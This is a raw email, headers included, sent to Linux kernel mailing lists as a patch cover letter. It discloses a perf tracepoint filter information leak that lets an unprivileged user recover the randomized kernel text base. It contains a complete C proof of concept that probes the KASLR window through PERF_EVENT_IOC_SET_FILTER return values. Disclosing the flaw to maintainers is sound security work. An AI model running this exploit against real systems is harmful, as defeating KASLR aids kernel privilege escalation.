Received: from mail-dl2-f42.google.com (mail-dl2-f42.google.com [74.125.229.170])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 034A338AC64
	for <stable@vger.kernel.org>; Mon, 28 Sep 2026 00:00:51 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.229.170
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790553654; cv=none; b=HMP7+Mr4ipQCVyl8h1Mv8f502g+uguPkv57IP7ch5KoiUNONLddGTGEjHwTA43tvC7zquSues/f8heK0vphQk2J8a0a5DKbeXDCU5S2hyV08nRMIWnhwAYca3xmUgQ+lDbGo4SmFuiaBeG3L6aXca7yTKWJoYAtLOo1h+q6MCkE=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790553654; c=relaxed/simple;
	bh=xAV81QeqR4ZtpFqOVKF9+IHtT4wTiC4bAZ5jEUD3yEo=;
	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=pO3Zo+CVc2fyLBGiKegrFk1x/LC4YfYOW6XFL5W3jwANKpybjXcE37ljcXK0xbb7CeeoRCL9Un6qQ66gSJWntjHBlCU8jDpuqURdvhPDkrECNclV87zrRr4Cw2oXd3cIqF1tEJhAzFEJDbVjlqPmgMiySTXLnEEDTl8ifEMWhes=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=rBT9DDkT; arc=none smtp.client-ip=74.125.229.170
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="rBT9DDkT"
Received: by mail-dl2-f42.google.com with SMTP id a92af1059eb24-144e32aaa1cso1275886c88.2
        for <stable@vger.kernel.org>; Sun, 27 Sep 2026 17:00:50 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1790553649; x=1791158449; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=SgLgFlJ5lNb0xBi63DpiDCEsIJzMQgnYp0doLWd9kSc=;
        b=rBT9DDkTXPWbjkWwrBHqlqaEKQ/ZD8ADHrbJ7+ys2B1XLtdVYmXbuzK3XUVEqu7O0N
         F+5PBYuzHUqv7HHitPBC+xPjVhaSCv04lWbCn8RS4x3pf6EWjDVWIMu75O6C8BjBqPOE
         7TXOQvLLy238pw3S8sNuePOAzrONfGgy+OzTHg8QZ03VuWa4dDUk0/BOBhA63K+RzocM
         Yr/0woGNn8GBQzhk0z8zRXcpI05CCkbhQHAjToWg9cga1oN6JSO1OFS9umxVKg+iQ1Yr
         N1vjCxg5Xmk/6AU5Vx/sHMpaRfoOhbDXIvvlu17yDPSoAjBkvUGJW4GN9K0UsNrpFeZa
         b/JQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790553649; x=1791158449;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=SgLgFlJ5lNb0xBi63DpiDCEsIJzMQgnYp0doLWd9kSc=;
        b=ba/AgojfSaPotMcjTyFXcC4TeN9n4wNn3Bzq4tC61pS6OUc0kRbHjaFGFp8ntx4qxf
         QLaBm7Nj/k7Gayw02by7sVAE4wMHDD2yyDcdHZq30tJr5h/UPRnALeDL+SkU38fYekKO
         8ie/JDCczbvgj5EOrpFt9Sm9rIFjgafpwIHEyfWt/rO134xgwI0UpTmzUjylTJ8nUlqG
         4WgCDKymJxn9fE9bzqPZD4b7RK3k/eQ0Lof+qTdRcUzg02zIczd6KwPV9m/jHs0gcFOI
         TKc52DyQ/k4nEww/08hia+Ub0RMkuYZxkHmaUTlRMmQDnRq/mnBFYFqpd+kpfafA5GWm
         ICeg==
X-Forwarded-Encrypted: i=1; AKwUvByr6IY37rKnMbvrCu3wXY8DV/a/iAOuoSovC9/Lopu6aP3kXdGIV9cp8eLfGiF0wGocmE2sLaE=@vger.kernel.org
X-Gm-Message-State: AFuF++nVWTuXroqki54P/CyUs+aVFUfrKbxrmr41T516AOdyltbGP3VK
	bEN7x/u/IjS/tjYuAM3PC7pNMzKREgkMV9AmE7Y/TUM4eT4lIUjGklTU
X-Gm-Gg: AYBFou3Pm/XgqLzUwzcUSTVCD1bji99+HLu93anLxLxwRBXTXaSI6/+bWrOPX46K3dI
	kpUz8ePg0nBCDZs3E7OxGSOuBmJTbQb58W38omReP+WjdlCsvA4innd4/AM0goCnv6URA2KoAA4
	awlaDQphxgvO0Wmw3ZVNUykhk5qU5P9Uclp+D4Jq+diw1ZsHO6P+rOgYt5TXHsNaSMQVe48SbsC
	O3ZYmsJ9vx6USfEEnS+5S8cv/K7VJt/4PusrIFExsllTvsrQS47NKYxw7qWA3EERSicgmrgdI+W
	Dz33bLhKzdc8WLGJMCiSED/3jnQ7d5TEIek9zTRvReo8LBGIX2ZQNNIp7x+W3FXy94Aw4Mb9fsD
	YOKtC9kw5YJV7zVSMKXzmTHqGedQY6+y6a4LZF2ezEPm5JsFBrbrL2AasQTwriA5r3yz8X93wZ6
	N9sk0cdnwpsKOAEIfJxDrHIoD1AsB48GiO/ooky0tspxIhlklfkHqpF4WCIOJVd4UFfDG9tadQY
	25CuG6F
X-Received: by 2002:a05:7022:f84:b0:13f:ad08:4497 with SMTP id a92af1059eb24-146ce1a80ffmr12159470c88.4.1790553647655;
        Sun, 27 Sep 2026 17:00:47 -0700 (PDT)
Received: from kq.cs.ucr.edu (kq.cs.ucr.edu. [169.235.27.223])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-145acc47ab8sm23752109c88.6.2026.09.27.17.00.41
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 27 Sep 2026 17:00:42 -0700 (PDT)
From: Zhengchuan Liang <zcliangcn@gmail.com>
To: Steven Rostedt <rostedt@goodmis.org>
Cc: Masami Hiramatsu <mhiramat@kernel.org>,
	Mathieu Desnoyers <mathieu.desnoyers@efficios.com>,
	Ross Zwisler <zwisler@google.com>,
	linux-trace-kernel@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	Peter Zijlstra <peterz@infradead.org>,
	linux-perf-users@vger.kernel.org,
	stable@vger.kernel.org,
	Zhengchuan Liang <zcliangcn@gmail.com>
Subject: [PATCH 0/1] perf tracepoint filter exposes the kernel text base
Date: Sun, 27 Sep 2026 17:00:30 -0700
Message-Id: <cover.1790553331.git.zcliangcn@gmail.com>
X-Mailer: git-send-email 2.25.1
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi,

I found and validated an information leak in
kernel/trace/trace_events_filter.c. An unprivileged user can recover the
randomized kernel text base, revealing the kernel's KASLR slide, by
observing PERF_EVENT_IOC_SET_FILTER return values for a disabled,
count-only perf tracepoint event.

Such an event can be opened with exclude_kernel=1 and sample_type=0. The
ioctl nevertheless accepts .function predicates. A numeric operand is
passed to kallsyms_lookup_size_offset(), so success distinguishes an
address in the kernel image from one outside it. A symbolic operand
likewise resolves a kernel symbol internally and can compare its address
with a task-controlled tracepoint field.

Here is a minimized numeric PoC for an x86_64 kernel built with
CONFIG_KALLSYMS_ALL=y. The scan uses 2 MiB steps, the minimum permitted
value of CONFIG_PHYSICAL_ALIGN on x86_64, and covers the 1 GiB virtual
KASLR window. Event ID 5 identifies the built-in TRACE_PRINT event.
The upstream default is perf_event_paranoid=2. Some distributions retain
that setting, while others use a stricter value. With the default
setting, run the PoC as an unprivileged user:

  #define _GNU_SOURCE
  #include <linux/perf_event.h>
  #include <stdio.h>
  #include <sys/ioctl.h>
  #include <sys/syscall.h>
  #include <unistd.h>

  int main(void)
  {
          struct perf_event_attr a = {
                  .type = PERF_TYPE_TRACEPOINT, .size = sizeof(a),
                  .config = 5, .disabled = 1, .exclude_kernel = 1,
          };
          int fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
          char filter[64];

          if (fd < 0)
                  return 1;
          for (unsigned long long p = 0xffffffff80000000ULL;
               p < 0xffffffffc0000000ULL; p += 0x200000ULL) {
                  snprintf(filter, sizeof(filter),
                           "ip.function == 0x%llx", p);
                  if (!ioctl(fd, PERF_EVENT_IOC_SET_FILTER, filter)) {
                          printf("_stext=0x%llx\n", p);
                          return 0;
                  }
          }
          return 2;
  }

I reproduced the leak under these conditions as an unprivileged user on
a kernel built from the current upstream tree. The reported _stext
matched the value in /proc/kallsyms as read by root. The PoC needs no
tracefs access or perf sample data.
